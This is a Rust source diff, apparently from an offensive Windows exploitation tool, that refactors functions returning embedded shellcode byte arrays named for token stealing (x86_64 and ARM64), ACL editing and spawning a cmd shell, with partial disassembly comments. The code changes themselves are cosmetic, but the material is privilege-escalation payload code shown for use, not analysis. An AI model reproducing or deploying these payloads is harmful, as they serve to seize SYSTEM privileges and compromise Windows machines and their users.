@@ -5,9 +5,9 @@ use goblin::pe::section_table::IMAGE_SCN_CNT_CODE;
 use goblin::Object;
 
 #[allow(dead_code)]
-#[cfg(all(target_arch = "x86_64"))]
+#[cfg(target_arch = "x86_64")]
 fn token_stealing_shellcode_fallback_x86_64() -> [u8; 84] {
-    return concat_bytes!(
+    *concat_bytes!(
         b"\x50",                             // 00000000: push rax
         b"\x51",                             // 00000001: push rcx
         b"\x52",                             // 00000002: push rdx
@@ -30,10 +30,9 @@ fn token_stealing_shellcode_fallback_x86_64() -> [u8; 84] {
         b"\x4c\x8b\xbc\x24\x88\x00\x00\x00", // 0000004B: mov r15, [rsp+0x88]
         b"\xc3"                              // 00000053: ret
     )
-    .clone();
 }
 
-#[cfg(all(target_arch = "aarch64"))]
+#[cfg(target_arch = "aarch64")]
 pub fn token_stealing_shellcode_fallback_arm64() -> [u8; 76] {
     return concat_bytes!(
         b"\xe0\x07\x3e\xa9", // 0000000000000000: stp x0,x1,[sp,#-0x20]
@@ -72,7 +71,7 @@ pub fn token_stealing_shellcode_fallback() -> [u8; 76] {
 #[rustfmt::skip]
 #[cfg(target_os = "windows")]
 pub fn acl_edit_shellcode_fallback() -> [u8; 111] {
-    return concat_bytes!(
+    *concat_bytes!(
         b"\x50",                                     // 0000000000000000: push rax
         b"\x51",                                     // 0000000000000001: push rcx
         b"\x52",                                     // 0000000000000002: push rdx
@@ -102,12 +101,11 @@ pub fn acl_edit_shellcode_fallback() -> [u8; 111] {
         b"\x4c\x8b\xbc\x24\x88\x00\x00\x00",         // 0000000000000066: mov r15,qword ptr [rsp+0000000000000088h]
         b"\xc3"                                      // 000000000000006E: ret
     )
-    .clone();
 }
 
 #[cfg(target_os = "windows")]
 pub fn spawn_cmd_shellcode_fallback() -> [u8; 387] {
-    return concat_bytes!(
+    *concat_bytes!(
         b"\xe9\xb9\x00\x00\x00",         // 0000000000000000: jmp spawn_cmd
         b"\x48\x83\xec\x28",             // 0000000000000005: sub rsp,28h
         b"\x48\xc7\xc1\x60\x00\x00\x00", // 0000000000000009: mov rcx,60h
@@ -216,7 +214,6 @@ pub fn spawn_cmd_shellcode_fallback() -> [u8; 387] {
         b"\x48\x81\xc4\x08\x05\x00\x00", // 000000000000017B: add rsp,508h
         b"\xc3"                          // 0000000000000182: ret
     )
-    .clone();
 }
 
 #[cfg(all(target_os = "windows", not(feature = "shellcode_fallback")))]
